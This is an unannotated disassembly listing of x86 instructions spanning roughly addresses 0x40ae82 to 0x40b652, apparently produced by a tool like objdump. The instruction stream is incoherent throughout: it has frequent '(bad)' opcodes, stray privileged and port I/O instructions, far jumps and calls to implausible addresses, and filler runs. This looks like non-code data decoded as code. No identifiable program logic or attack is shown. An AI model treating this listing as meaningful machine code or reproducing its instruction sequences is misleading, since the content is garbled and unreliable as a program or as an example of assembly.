  40ae82:	pop    ecx
  40ae83:	leave  
  40ae84:	adc    eax,0x26cde8c0
  40ae89:	cmp    BYTE PTR [ebp-0x75005940],bl
  40ae8f:	pop    eax
  40ae90:	pop    eax
  40ae91:	and    al,0x69
  40ae93:	adc    BYTE PTR [esi],0x1
  40ae96:	jne    0x40ae71
  40ae98:	jg     0x40aedd
  40ae9a:	cdq    
  40ae9b:	aad    0x32
  40ae9d:	call   0x45da34
  40aea2:	clc    
  40aea3:	sbb    BYTE PTR [eax+0xd],bl
  40aea6:	lds    esi,FWORD PTR [ecx]
  40aea8:	(bad)  
  40aea9:	stc    
  40aeaa:	push   edx
  40aeab:	adc    BYTE PTR [edi+0x2ad917b],al
  40aeb1:	jne    0x40af22
  40aeb3:	push   ecx
  40aeb4:	ins    BYTE PTR es:[edi],dx
  40aeb5:	cmp    DWORD PTR [ebp-0x27],esi
  40aeb8:	fisttp DWORD PTR [eax+eax*1]
  40aebb:	add    BYTE PTR [eax],al
  40aebd:	add    BYTE PTR [eax],al
  40aebf:	je     0x40ae9a
  40aec1:	add    al,BYTE PTR [eax+0xf02ddaa]
  40aec7:	clc    
  40aec8:	push   edx
  40aec9:	add    al,0x0
  40aecb:	jne    0x40af23
  40aecd:	push   eax
  40aece:	and    al,0x9d
  40aed0:	mov    ebp,DWORD PTR [ebp+0x51400e7]
  40aed6:	add    BYTE PTR [esi-0x29],al
  40aed9:	cmp    BYTE PTR [ebx-0xa2efdce],cl
  40aedf:	sub    al,0x1
  40aee1:	jmp    0xf196d96d
  40aee6:	jle    0x40af1e
  40aee8:	es push ebp
  40aeea:	or     eax,0x7af61a65
  40aeef:	mov    bh,0x85
  40aef1:	mov    eax,ds:0xe5c1e102
  40aef6:	cdq    
  40aef7:	add    dh,BYTE PTR [edx]
  40aef9:	rcr    DWORD PTR [edi],0xfe
  40aefc:	add    cl,ch
  40aefe:	cmp    DWORD PTR [eax],eax
  40af00:	dec    esi
  40af01:	lds    ebx,FWORD PTR [edi-0x63]
  40af04:	and    edx,DWORD PTR [edx+0x4]
  40af07:	jne    0x40ae8f
  40af09:	mov    cl,0x58
  40af0b:	ins    BYTE PTR es:[edi],dx
  40af0c:	jnp    0x40af3a
  40af0e:	sub    BYTE PTR [ecx+0x750335d9],al
  40af14:	add    ah,BYTE PTR [edi+ecx*4+0x56]
  40af18:	jp     0x40af04
  40af1a:	add    esi,DWORD PTR [ebp-0x39]
  40af1d:	ins    BYTE PTR es:[edi],dx
  40af1e:	daa    
  40af1f:	cmc    
  40af20:	add    cl,ch
  40af22:	add    eax,DWORD PTR [eax]
  40af24:	add    BYTE PTR [eax],al
  40af26:	add    BYTE PTR [eax],al
  40af28:	and    DWORD PTR ds:0xa44d03a9,edi
  40af2e:	xchg   ecx,eax
  40af2f:	add    al,0x75
  40af31:	int    0xfb
  40af33:	pop    ss
  40af34:	sub    DWORD PTR [edx-0x17],eax
  40af37:	xor    dh,0x26
  40af3a:	ins    DWORD PTR es:[edi],dx
  40af3b:	add    eax,0x47600275
  40af40:	xchg   ecx,eax
  40af41:	or     bh,BYTE PTR [edi-0x56d94980]
  40af47:	xor    edi,eax
  40af49:	push   esi
  40af4a:	int    0x13
  40af4c:	cmp    al,BYTE PTR [edi-0x3b]
  40af4f:	adc    ecx,DWORD PTR [ecx]
  40af51:	push   edi
  40af52:	test   eax,0x77ba1d03
  40af57:	add    esi,DWORD PTR [ebp+0x58]
  40af5a:	add    cl,ch
  40af5c:	xor    BYTE PTR [ebp+0x1a52a5c6],0xe4
  40af63:	pop    ebp
  40af64:	cmp    DWORD PTR [edx],eax
  40af66:	call   0x43ab0f
  40af6b:	ret    0xcd8e
  40af6e:	adc    al,0xe1
  40af70:	loope  0x40af7f
  40af72:	add    BYTE PTR [edx+0x34],dh
  40af75:	cli    
  40af76:	test   BYTE PTR [eax-0x667501d3],dh
  40af7c:	pusha  
  40af7d:	mov    bl,0x80
  40af7f:	mov    bl,0x71
  40af81:	cs es in al,dx
  40af84:	dec    esp
  40af85:	add    DWORD PTR [ecx+0x34cca926],ecx
  40af8b:	fld    QWORD PTR [eax]
  40af8d:	add    BYTE PTR [eax],al
  40af8f:	add    BYTE PTR [eax],al
  40af91:	jmp    0x2026:0x2d5c0040
  40af98:	jo     0x40afd7
  40af9a:	cmp    BYTE PTR es:[ebx],dl
  40af9d:	jbe    0x40b01e
  40af9f:	inc    ebx
  40afa0:	int    0x36
  40afa2:	xor    cl,BYTE PTR [ebp-0x38edad0b]
  40afa8:	lods   eax,DWORD PTR ds:[esi]
  40afa9:	call   0xc602:0xb6afc01a
  40afb0:	lods   eax,DWORD PTR ds:[esi]
  40afb1:	call   0x3026:0xad26001e
  40afb8:	push   ebp
  40afb9:	lods   eax,DWORD PTR ds:[esi]
  40afba:	inc    edx
  40afbb:	add    BYTE PTR [ecx-0x52],dl
  40afbe:	push   ebx
  40afbf:	add    cl,ch
  40afc1:	shl    BYTE PTR [ebp-0x116d5a3a],0xa7
  40afc8:	mov    bh,0xb6
  40afca:	add    cl,BYTE PTR [ebx-0x7c01ad5b]
  40afd0:	xor    cl,dl
  40afd2:	push   es
  40afd3:	mov    esp,DWORD PTR [ebp+0x8af252]
  40afd9:	clc    
  40afda:	and    al,0x18
  40afdc:	push   eax
  40afdd:	or     esi,esp
  40afdf:	xor    edx,esp
  40afe1:	iret   
  40afe2:	add    bh,bh
  40afe4:	adc    eax,0x3ed62c
  40afe9:	cdq    
  40afea:	add    al,0x1
  40afec:	add    ah,bl
  40afee:	add    DWORD PTR [esi+esi*4-0x72024e36],eax
  40aff5:	add    BYTE PTR [eax],al
  40aff7:	add    BYTE PTR [eax],al
  40aff9:	add    BYTE PTR [eax-0x44afafe6],dl
  40afff:	ror    DWORD PTR [esi],cl
  40b001:	adc    ebx,DWORD PTR [esi+eax*1+0x4f675e5f]
  40b008:	in     al,0x5d
  40b00a:	ud2    
  40b00c:	push   edi
  40b00d:	mov    ecx,DWORD PTR ds:0x8a8d002f
  40b013:	into   
  40b014:	out    0x22,al
  40b016:	inc    esi
  40b017:	add    BYTE PTR [eax],al
  40b019:	not    BYTE PTR [eax+0x1a]
  40b01c:	or     al,0x1
  40b01e:	jecxz  0x40b01a
  40b020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b021:	dec    esi
  40b022:	pop    esp
  40b023:	push   es
  40b024:	je     0x40b02c
  40b026:	bound  ebp,QWORD PTR [esi-0x4df406b2]
  40b02c:	pop    ebp
  40b02d:	mov    esp,DWORD PTR [edx+0x5c04c211]
  40b033:	adc    eax,0x171dec8b
  40b038:	push   edi
  40b039:	inc    DWORD PTR [ecx-0x38]
  40b03c:	xor    ebx,ebx
  40b03e:	out    dx,eax
  40b03f:	daa    
  40b040:	jp     0x40b046
  40b042:	pop    esp
  40b043:	add    BYTE PTR [eax+0x13b28b5d],cl
  40b049:	mov    eax,0x8b00401e
  40b04e:	push   esp
  40b04f:	(bad)  
  40b050:	cli    
  40b051:	je     0x40b04f
  40b053:	or     DWORD PTR [ebx-0x1],edx
  40b056:	jne    0x40b0c6
  40b058:	(bad)  
  40b059:	out    0x1a,eax
  40b05b:	or     al,BYTE PTR [ebx]
  40b05d:	add    BYTE PTR [eax],al
  40b05f:	add    BYTE PTR [eax],al
  40b061:	add    BYTE PTR [eax],al
  40b063:	dec    cl
  40b065:	or     dh,bl
  40b067:	adc    DWORD PTR [ecx+0x2691051b],0x68a60044
  40b071:	xor    eax,DWORD PTR ds:0x45628a
  40b077:	inc    ebp
  40b078:	or     BYTE PTR [ebx],dh
  40b07a:	push   edi
  40b07b:	loop   0x40b04b
  40b07d:	mov    ss,WORD PTR [ecx]
  40b07f:	xor    eax,0x7d447bd9
  40b084:	add    bl,al
  40b086:	jae    0x40b0f6
  40b088:	xor    esp,esi
  40b08a:	es jne 0x40b066
  40b08d:	xor    bh,bh
  40b08f:	pusha  
  40b090:	stc    
  40b091:	repnz aas 
  40b093:	jne    0x40b039
  40b095:	pop    eax
  40b096:	or     BYTE PTR [edx+0x3512fed6],ch
  40b09c:	fld    st(4)
  40b09e:	inc    esp
  40b09f:	call   0x82d9:0x1d0dd9da
  40b0a6:	dec    DWORD PTR [edx-0x7da8ca18]
  40b0ac:	scas   al,BYTE PTR es:[edi]
  40b0ad:	xchg   esi,eax
  40b0ae:	adc    DWORD PTR ds:0x88ff35d9,esi
  40b0b4:	aad    0xf1
  40b0b6:	aas    
  40b0b7:	jne    0x40b044
  40b0b9:	js     0x40b0ff
  40b0bb:	bound  edx,QWORD PTR [ecx+ebp*1+0x2e137c9]
  40b0c2:	push   ebp
  40b0c3:	(bad)  
  40b0c4:	xor    al,0x85
  40b0c6:	jmp    0x40b0c8
  40b0c8:	add    BYTE PTR [eax],al
  40b0ca:	add    BYTE PTR [eax],al
  40b0cc:	mov    eax,ds:0xa60002d7
  40b0d1:	pusha  
  40b0d2:	icebp  
  40b0d3:	or     esp,DWORD PTR [esi-0x67]
  40b0d6:	add    dl,BYTE PTR [esi-0x36]
  40b0d9:	add    bl,dl
  40b0db:	into   
  40b0dc:	xor    BYTE PTR [ebp+0x1e],al
  40b0df:	add    al,0xec
  40b0e1:	dec    esp
  40b0e2:	sbb    eax,0xb5ca997d
  40b0e7:	pop    ecx
  40b0e8:	ja     0x40b0b5
  40b0ea:	fistp  DWORD PTR [ebx+0x7ce94264]
  40b0f0:	mov    ecx,0x9515fd2
  40b0f5:	jg     0x40b0e7
  40b0f7:	into   
  40b0f8:	add    DWORD PTR [esi+0x275051c],0x6c
  40b0ff:	mov    BYTE PTR [edx],dl
  40b101:	int    0xd5
  40b103:	into   
  40b104:	sub    cl,bl
  40b106:	push   ebx
  40b107:	aam    0xbb
  40b109:	test   BYTE PTR [eax-0x30],bh
  40b10c:	retf   
  40b10d:	retf   0x20c
  40b110:	jne    0x40b114
  40b112:	mov    dh,0xf8
  40b114:	or     dh,al
  40b116:	sub    BYTE PTR [esp+ebx*4],al
  40b119:	retf   0x3e8
  40b11c:	jne    0x40b195
  40b11e:	imul   ecx,DWORD PTR [ebx+0xa95caa1],0xffffffaa
  40b125:	cli    
  40b126:	data16 in al,0x92
  40b129:	retf   0xae8
  40b12c:	js     0x40b0ec
  40b12e:	xchg   edi,eax
  40b12f:	inc    edx
  40b130:	add    BYTE PTR [eax],al
  40b132:	add    BYTE PTR [eax],al
  40b134:	add    BYTE PTR [ebp-0x5],dh
  40b137:	ins    BYTE PTR es:[edi],dx
  40b138:	mov    eax,0x12e8ca7a
  40b13d:	xor    eax,0xe0cbe40c
  40b142:	hlt    
  40b143:	jno    0x40b17d
  40b145:	imul   ecx,DWORD PTR [eiz*8+0x2a7e6b81],0xa9027503
  40b150:	or     dh,BYTE PTR [eax-0x5a224536]
  40b156:	(bad)  
  40b158:	ss clc 
  40b15a:	leave  
  40b15b:	(bad)  
  40b15c:	pusha  
  40b15d:	mov    ebp,0x2b2e3ada
  40b162:	xchg   BYTE PTR [edx-0xfd8917],ch
  40b168:	pop    esp
  40b169:	out    dx,al
  40b16a:	(bad)  
  40b16b:	dec    BYTE PTR [esi]
  40b16d:	dec    ebx
  40b16e:	pop    edx
  40b16f:	add    ch,ch
  40b171:	jbe    0x40b175
  40b173:	call   esp
  40b175:	out    dx,al
  40b176:	repz aas 
  40b178:	jmp    0xf67b8afc
  40b17d:	lock test DWORD PTR [ecx-0x72fd8917],ecx
  40b184:	and    al,0xcd
  40b186:	cmp    DWORD PTR [esi-0x3f],edx
  40b189:	in     eax,dx
  40b18a:	adc    al,BYTE PTR [ecx]
  40b18c:	jmp    0xc7382f19
  40b191:	add    al,0x7f
  40b193:	(bad)  
  40b194:	xor    eax,0xcd447d2a
  40b199:	add    BYTE PTR [eax],al
  40b19b:	add    BYTE PTR [eax],al
  40b19d:	add    BYTE PTR [edi+edi*8+0x67],ch
  40b1a1:	pushf  
  40b1a2:	xor    al,0x2
  40b1a4:	jne    0x40b1b3
  40b1a6:	mov    eax,0xf6f4ff10
  40b1ab:	stc    
  40b1ac:	aas    
  40b1ad:	jmp    0x9ca0b11f
  40b1b2:	xor    al,0x2
  40b1b4:	jne    0x40b1d3
  40b1b6:	or     al,0xf8
  40b1b8:	dec    edi
  40b1b9:	dec    eax
  40b1ba:	inc    ebp
  40b1bb:	mov    bh,0x42
  40b1bd:	jmp    0x5b277abf
  40b1c2:	inc    ecx
  40b1c3:	enter  0x6cfe,0x31
  40b1c7:	dec    esi
  40b1c8:	inc    ecx
  40b1c9:	jb     0x40b16d
  40b1cb:	retf   0xe58c
  40b1ce:	fild   DWORD PTR ds:0x7776e900
  40b1d4:	je     0x40b1d6
  40b1d6:	mov    BYTE PTR [esi-0x487c090c],ah
  40b1dc:	add    al,0xf8
  40b1df:	jmp    0x4ba5076e
  40b1e4:	test   BYTE PTR [eax-0x740248af],bh
  40b1ea:	shl    DWORD PTR [eax-0x488b8a03],1
  40b1f0:	inc    ebx
  40b1f1:	clc    
  40b1f2:	add    DWORD PTR [ecx-0x14],0xffffff89
  40b1f6:	sbb    BYTE PTR [esi+edi*8-0x4b],dl
  40b1fa:	mov    ah,0xb9
  40b1fc:	std    
  40b1fd:	push   DWORD PTR [esi+eax*1-0x2]
  40b201:	inc    DWORD PTR [eax]
  40b203:	add    BYTE PTR [eax],al
  40b205:	add    BYTE PTR [eax],al
  40b207:	jecxz  0x40b189
  40b209:	mov    esi,0x43bed874
  40b20e:	dec    ebp
  40b210:	or     eax,0xb5bb83e8
  40b215:	std    
  40b216:	xor    eax,ebx
  40b218:	mov    ch,0x73
  40b21a:	call   0x85cc43d2
  40b21f:	cmp    al,0xb8
  40b221:	std    
  40b222:	call   FWORD PTR [edi+esi*4+0x73]
  40b226:	lock jecxz 0x40b1f8
  40b229:	stos   BYTE PTR es:[edi],al
  40b22a:	adc    bl,BYTE PTR [esi+edi*8-0x7c]
  40b22e:	rcl    BYTE PTR [ebx+0x3fef77f],0xb6
  40b235:	std    
  40b236:	jne    0x40b224
  40b238:	mov    ch,0xd1
  40b23a:	cmp    DWORD PTR [ecx-0x1e],esi
  40b23d:	or     eax,0xfdb74885
  40b242:	inc    DWORD PTR [ebx]
  40b244:	xor    ah,dh
  40b246:	call   0x3e5fdd
  40b24b:	out    0x40,al
  40b24d:	call   FWORD PTR [edi+0x22]
  40b250:	sbb    ecx,ecx
  40b252:	ret    
  40b253:	jne    0x40b1db
  40b255:	ja     0x40b242
  40b257:	test   BYTE PTR ds:0x54a25623,0xe
  40b25e:	pushf  
  40b25f:	imul   ebx,DWORD PTR [ecx-0x3dbcccfe],0xd97503cb
  40b269:	pop    eax
  40b26a:	inc    DWORD PTR [eax]
  40b26c:	add    BYTE PTR [eax],al
  40b26e:	add    BYTE PTR [eax],al
  40b270:	ret    
  40b271:	and    BYTE PTR [esi+0x8],dl
  40b274:	(bad)  
  40b275:	fcmove st,st(3)
  40b277:	adc    al,0xd1
  40b279:	lds    eax,FWORD PTR [edx+0x0]
  40b27c:	cld    
  40b27d:	sahf   
  40b27e:	into   
  40b27f:	or     BYTE PTR ds:0xee2356db,0x9e
  40b286:	into   
  40b287:	pop    esi
  40b288:	fwait
  40b289:	and    al,cl
  40b28b:	add    esi,DWORD PTR [ebp+0x5c]
  40b28e:	dec    esi
  40b28f:	in     al,0x87
  40b291:	and    eax,0xb9388cd5
  40b296:	xor    edi,edi
  40b298:	cmp    BYTE PTR [ecx-0x11],0x3f
  40b29c:	jne    0x40b2c4
  40b29e:	inc    ecx
  40b29f:	loopne 0x40b2c6
  40b2a1:	shl    al,0x97
  40b2a4:	imul   ebx,DWORD PTR [ecx],0xe7746a04
  40b2aa:	xor    DWORD PTR [esi+0x0],edx
  40b2ad:	pop    ds
  40b2ae:	in     al,0x4f
  40b2b0:	stos   BYTE PTR es:[edi],al
  40b2b1:	mov    BYTE PTR [eax-0x216fd741],al
  40b2b7:	mov    al,0x9a
  40b2b9:	in     eax,0x1f
  40b2bb:	add    al,0x92
  40b2bd:	into   
  40b2be:	adc    WORD PTR ds:0x7124c9d9,si
  40b2c5:	lods   al,BYTE PTR ds:[esi]
  40b2c6:	inc    edx
  40b2c7:	add    BYTE PTR [edx-0x3b],bh
  40b2ca:	push   ds
  40b2cb:	add    al,0xdf
  40b2cd:	fstp   DWORD PTR [edx+0x0]
  40b2d0:	jne    0x40b2d4
  40b2d2:	stc    
  40b2d3:	add    eax,DWORD PTR [eax]
  40b2d5:	add    BYTE PTR [eax],al
  40b2d7:	add    BYTE PTR [eax],al
  40b2d9:	(bad)  
  40b2da:	in     eax,dx
  40b2db:	mov    dh,dh
  40b2dd:	call   0xb8fb:0xc6c46c02
  40b2e4:	retf   0xf661
  40b2e7:	fld    DWORD PTR [ebx+0x75]
  40b2ea:	xchg   edx,eax
  40b2eb:	out    0xde,eax
  40b2ed:	je     0x40b303
  40b2ef:	sub    esi,eax
  40b2f1:	jbe    0x40b2f5
  40b2f3:	xchg   esp,eax
  40b2f4:	jle    0x40b314
  40b2f6:	xor    esi,DWORD PTR [edx+0x29]
  40b2f9:	ins    DWORD PTR es:[edi],dx
  40b2fa:	add    edi,DWORD PTR [ebx+esi*8-0x489e4111]
  40b301:	sbb    bl,BYTE PTR [eax]
  40b303:	jmp    0x28bf280b
  40b308:	push   ecx
  40b309:	jns    0x40b31e
  40b30b:	sub    edi,ebx
  40b30d:	push   ebp
  40b30e:	xor    dh,dh
  40b310:	push   eax
  40b311:	test   DWORD PTR [ebx-0x4b],edi
  40b314:	push   es
  40b315:	pusha  
  40b316:	cli    
  40b317:	in     eax,0x50
  40b319:	jno    0x40b34b
  40b31b:	fdivrp st(0),st
  40b31d:	sahf   
  40b31e:	lock sub BYTE PTR [esi+esi*8],al
  40b322:	mov    ebp,0xfe2a0edc
  40b327:	ds pop es
  40b329:	in     al,dx
  40b32a:	es in  eax,0x7e
  40b32d:	mov    al,0x27
  40b32f:	adc    ch,BYTE PTR [ecx]
  40b331:	mov    bh,0xf5
  40b333:	call   0x3e12b169
  40b338:	cmovnp edi,edx
  40b33b:	push   ss
  40b33c:	daa    
  40b33d:	add    BYTE PTR [eax],al
  40b33f:	add    BYTE PTR [eax],al
  40b341:	add    dh,ch
  40b343:	aaa    
  40b344:	in     eax,0x78
  40b346:	xor    eax,0x6c563c7
  40b34b:	cld    
  40b34c:	jge    0x40b301
  40b34e:	push   edi
  40b34f:	(bad)  
  40b350:	jmp    0xaa319
  40b355:	cmp    DWORD PTR [eax+0x79],0xb54916f9
  40b35c:	hlt    
  40b35d:	data16 das 
  40b35f:	cmp    BYTE PTR [edi+0x7d7b75d5],0xe1
  40b366:	out    0x2,al
  40b368:	pop    edi
  40b369:	scas   eax,DWORD PTR es:[edi]
  40b36a:	xor    ebp,DWORD PTR [edi]
  40b36c:	mov    edx,DWORD PTR [ebp-0x5]
  40b36f:	int    0xfe
  40b371:	mov    ah,0x39
  40b373:	lds    esi,FWORD PTR [ebp+eiz*8+0x3f]
  40b377:	out    dx,eax
  40b378:	jmp    0x40b355
  40b37a:	mov    dh,0x2
  40b37c:	call   FWORD PTR [esi+eiz*1-0x3ae1afd0]
  40b383:	imul   BYTE PTR [ecx-0x17]
  40b386:	aas    
  40b387:	dec    edi
  40b388:	or     BYTE PTR [esi],cl
  40b38a:	add    eax,0x76a9116e
  40b38f:	cmp    DWORD PTR [ecx+ebx*8+0x76],0x35b20d44
  40b397:	bnd jnp 0x40b385
  40b39a:	add    edx,0x32
  40b39d:	mov    al,0x57
  40b39f:	jnp    0x40b3ac
  40b3a1:	daa    
  40b3a2:	xchg   edx,eax
  40b3a3:	ror    BYTE PTR [ebx],0xe9
  40b3a6:	add    BYTE PTR [eax],al
  40b3a8:	add    BYTE PTR [eax],al
  40b3aa:	add    BYTE PTR [ebx+0x483aeb79],ah
  40b3b0:	lods   eax,DWORD PTR ds:[esi]
  40b3b1:	push   ebp
  40b3b2:	push   ds
  40b3b3:	clc    
  40b3b4:	enter  0x34fe,0xb8
  40b3b8:	les    esi,FWORD PTR [ebp+eiz*8-0x43]
  40b3bc:	out    dx,al
  40b3bd:	jmp    0x40b39a
  40b3bf:	add    cl,BYTE PTR ss:[ebx-0xfdbc3f]
  40b3c6:	adc    al,0x9d
  40b3c8:	adc    dh,dh
  40b3ca:	xchg   esi,eax
  40b3cb:	inc    edx
  40b3cc:	cli    
  40b3cd:	mov    ch,BYTE PTR [edx+0xfe69a9]
  40b3d3:	sti    
  40b3d4:	mov    ebx,0xbb11f889
  40b3d9:	jl     0x40b400
  40b3db:	mov    ds:0xd13f034d,eax
  40b3e0:	mov    esi,0x50c41d72
  40b3e5:	hlt    
  40b3e6:	(bad)  
  40b3e7:	mov    ebx,0xb285ef47
  40b3ec:	xor    dl,BYTE PTR [edx]
  40b3ee:	push   edi
  40b3ef:	mov    ebx,0x8f8b0c35
  40b3f4:	mov    ebx,0x35a40873
  40b3f9:	(bad)  
  40b3fa:	jmp    FWORD PTR [ebx+0x47]
  40b3fd:	(bad)
  40b400:	out    dx,al
  40b401:	mov    edi,0x5d163a5f
  40b406:	ret    0x124
  40b409:	push   ebp
  40b40a:	mov    edi,DWORD PTR [eax+0x11]
  40b40d:	push   ebx
  40b40e:	push   esi
  40b40f:	add    BYTE PTR [eax],al
  40b411:	add    BYTE PTR [eax],al
  40b413:	add    bl,al
  40b415:	mov    ecx,0xb6870873
  40b41a:	mov    ecx,esi
  40b41c:	sti    
  40b41d:	ror    DWORD PTR [esi-0x74fee3ee],cl
  40b423:	fmul   DWORD PTR [ecx+0x2]
  40b426:	cmp    ecx,DWORD PTR [ebp-0x76fe0170]
  40b42c:	xchg   ecx,eax
  40b42d:	mov    edx,0xa8457f
  40b432:	add    al,0x0
  40b434:	fdivr  QWORD PTR [edi-0x3f]
  40b437:	add    dh,cl
  40b439:	add    BYTE PTR [eax],al
  40b43b:	xor    DWORD PTR [edi-0x63600000],0x898b3831
  40b445:	mov    edx,0xba00a9e6
  40b44a:	std    
  40b44b:	test   ah,cl
  40b44d:	xor    al,0x2c
  40b44f:	push   DWORD PTR [ebp-0x1a]
  40b452:	test   DWORD PTR [edx+0x84d7473],0x534ad6f0
  40b45c:	and    eax,0x86afee44
  40b461:	sbb    DWORD PTR [eax*4-0x73452dcb],eax
  40b468:	scas   al,BYTE PTR es:[edi]
  40b469:	pop    esp
  40b46a:	or     al,0xc1
  40b46c:	fcomp  DWORD PTR [edx]
  40b46e:	add    al,0xf8
  40b470:	(bad)  
  40b471:	rcl    DWORD PTR [ebx],cl
  40b473:	leave  
  40b474:	shl    DWORD PTR [edx-0x9],cl
  40b477:	ja     0x40b479
  40b479:	add    BYTE PTR [eax],al
  40b47b:	add    BYTE PTR [eax],al
  40b47d:	out    dx,al
  40b47e:	adc    al,0xdc
  40b480:	add    dh,dh
  40b482:	adc    eax,ecx
  40b484:	pop    esi
  40b485:	shl    DWORD PTR [eax-0x47],cl
  40b488:	sar    DWORD PTR [ebp-0x27],0x30
  40b48c:	push   edi
  40b48d:	and    ah,BYTE PTR [esi+0x1e]
  40b490:	or     al,0xee
  40b492:	jmp    0xc861c95e
  40b497:	inc    edx
  40b498:	add    dh,bh
  40b49a:	icebp  
  40b49b:	add    esi,0x2d775
  40b4a1:	hlt    
  40b4a2:	les    eax,FWORD PTR [ecx]
  40b4a4:	add    BYTE PTR ds:0xf8304fda,dl
  40b4aa:	fs add eax,ebp
  40b4ad:	sub    al,0xa5
  40b4af:	(bad)  
  40b4b0:	(bad)  
  40b4b1:	icebp  
  40b4b2:	cdq    
  40b4b3:	dec    edi
  40b4b4:	and    al,0xd2
  40b4b6:	and    eax,0x2dca1020
  40b4bb:	and    BYTE PTR [eax],dl
  40b4bd:	sub    bh,BYTE PTR [ebp+ecx*1-0xd8a9f01]
  40b4c4:	aas    
  40b4c5:	jne    0x40b51d
  40b4c7:	les    esi,FWORD PTR [edi-0x3c]
  40b4ca:	es aaa 
  40b4cc:	call   FWORD PTR [esi+0x2]
  40b4cf:	test   al,0x49
  40b4d1:	scas   eax,DWORD PTR es:[edi]
  40b4d2:	ja     0x40b4c2
  40b4d4:	mov    ebp,0xdae8fa76
  40b4d9:	ja     0x40b55a
  40b4db:	mov    al,ds:0xab2423c7
  40b4e0:	cld    
  40b4e1:	add    BYTE PTR [eax],al
  40b4e3:	add    BYTE PTR [eax],al
  40b4e5:	add    BYTE PTR [edx+0x2d],bh
  40b4e8:	jae    0x40b49e
  40b4ea:	xor    bl,al
  40b4ec:	in     al,dx
  40b4ed:	mul    BYTE PTR [eax]
  40b4ef:	mov    al,0x2
  40b4f1:	std    
  40b4f2:	rcr    BYTE PTR [esi],0xf6
  40b4f5:	pop    ebp
  40b4f6:	sahf   
  40b4f7:	rol    BYTE PTR [ecx],1
  40b4f9:	into   
  40b4fa:	neg    ebx
  40b4fc:	in     eax,dx
  40b4fd:	xor    BYTE PTR [eax],0x12
  40b500:	mov    DWORD PTR [edx],0xc47ef347
  40b506:	int3   
  40b507:	stc    
  40b508:	mov    ds:0xd1b26e5d,al
  40b50d:	mov    cl,0xf7
  40b50f:	(bad)  
  40b511:	xor    BYTE PTR [edx+edx*1],0x8f
  40b515:	add    al,BYTE PTR [ebp+0x5c]
  40b518:	jo     0x40b52f
  40b51a:	fwait
  40b51b:	jns    0x40b4d4
  40b51d:	add    DWORD PTR [ebx+0x3cc69bf],ebp
  40b523:	dec    ebp
  40b524:	xrelease mov BYTE PTR [esi-0x76391ae2],0x72
  40b52c:	fiadd  DWORD PTR [ebx+0x75]
  40b52f:	jmp    FWORD PTR [eax]
  40b531:	xor    al,0xe2
  40b533:	dec    ebp
  40b534:	or     eax,0xaada40fc
  40b539:	iret   
  40b53a:	rol    edx,cl
  40b53c:	sbb    DWORD PTR [ebp+0x13dc7950],edi
  40b542:	mov    bh,0xfd
  40b544:	call   0x340377cb
  40b549:	cli    
  40b54a:	add    BYTE PTR [eax],al
  40b54c:	add    BYTE PTR [eax],al
  40b54e:	add    BYTE PTR [ebx+0x750d004d],dh
  40b554:	ret    
  40b555:	adc    al,0xbd
  40b557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b558:	add    al,BYTE PTR [eax]
  40b55a:	cmp    DWORD PTR [edx+0x60f1244e],esi
  40b560:	ficomp DWORD PTR [esi-0x3a3c4c63]
  40b566:	in     eax,0x80
  40b568:	ret    0xedc0
  40b56b:	jbe    0x40b5ec
  40b56d:	jnp    0x40b534
  40b56f:	jb     0x40b533
  40b571:	jae    0x40b560
  40b573:	xchg   edx,eax
  40b575:	jmp    0x5cdc:0xfeb9f7be
  40b57c:	shl    DWORD PTR [ebx+0x5],0x75
  40b580:	rcl    DWORD PTR [ecx+edi*2],0x44
  40b584:	add    al,BYTE PTR [eax]
  40b586:	mov    bh,0xbd
  40b588:	cmc    
  40b589:	push   DWORD PTR [ebx+0x78]
  40b58c:	add    al,0x85
  40b58e:	sub    edx,eax
  40b590:	push   ss
  40b591:	call   0xff01fccc
  40b596:	fs ss or edi,DWORD PTR ss:[edi-0x12dbc9cd]
  40b59f:	inc    esi
  40b5a0:	stos   BYTE PTR es:[edi],al
  40b5a1:	pop    esi
  40b5a2:	sbb    eax,0x2b5dc133
  40b5a7:	add    al,dl
  40b5a9:	add    DWORD PTR [ebp-0x68fff9a6],0xed74b16f
  40b5b3:	add    BYTE PTR [eax],al
  40b5b5:	add    BYTE PTR [eax],al
  40b5b7:	add    BYTE PTR [edi-0x842153e],al
  40b5bd:	mov    edi,0xc0dd5cfe
  40b5c2:	jae    0x40b5c9
  40b5c4:	rol    eax,1
  40b5c6:	adc    al,0xc5
  40b5c8:	mov    DWORD PTR [ecx],0x8ea96200
  40b5ce:	inc    ebp
  40b5cf:	add    ch,cl
  40b5d1:	inc    eax
  40b5d2:	mov    edi,0xbfdeb874
  40b5d7:	repz jecxz 0x40b5a1
  40b5da:	add    eax,0x68
  40b5dd:	mov    ebx,0xe278ff54
  40b5e2:	or     edx,DWORD PTR [eax-0x1c]
  40b5e5:	in     eax,0xf3
  40b5e7:	jmp    ebx
  40b5e9:	call   0xf2ccbaaf
  40b5ee:	push   ebp
  40b5ef:	mov    edi,ebp
  40b5f1:	out    dx,al
  40b5f2:	mov    bh,al
  40b5f4:	fnop   
  40b5f6:	jb     0x40b638
  40b5f8:	xlat   BYTE PTR ds:[ebx]
  40b5f9:	test   eax,0x68c128e
  40b5fe:	cmp    edi,0xffffffd3
  40b601:	push   ecx
  40b602:	or     bh,bh
  40b604:	sub    BYTE PTR [ecx],ah
  40b606:	adc    bh,bh
  40b608:	(bad)  
  40b609:	cmp    esi,edi
  40b60b:	jmp    FWORD PTR [edx-0x39]
  40b60e:	ror    DWORD PTR [ebx+0x3b0b3994],1
  40b614:	mov    eax,ds:0xb40208fa
  40b619:	xlat   BYTE PTR ds:[ebx]
  40b61a:	lock inc DWORD PTR [eax]
  40b61d:	add    BYTE PTR [eax],al
  40b61f:	add    BYTE PTR [eax],al
  40b621:	push   ebx
  40b622:	cmp    BYTE PTR [esi+0x3381b74],0x3f
  40b629:	int3   
  40b62a:	cmp    DWORD PTR ds:0x1420e8ff,eax
  40b630:	lea    ebx,[eax]
  40b632:	in     eax,dx
  40b633:	dec    edi
  40b634:	call   0x3e8993
  40b639:	lods   al,BYTE PTR ds:[esi]
  40b63a:	add    eax,0xc52e02eb
  40b63f:	pop    ebp
  40b640:	pop    esi
  40b641:	pop    es
  40b642:	ret    
  40b643:	add    al,BYTE PTR [eax]
  40b645:	dec    edi
  40b646:	dec    ecx
  40b647:	and    al,0x4
  40b649:	fdivr  st(1),st
  40b64b:	push   ebp
  40b64c:	push   edi
  40b64d:	jne    0x40b673
  40b64f:	stos   DWORD PTR es:[edi],eax
  40b650:	mov    al,ah
  40b652:	push   esi
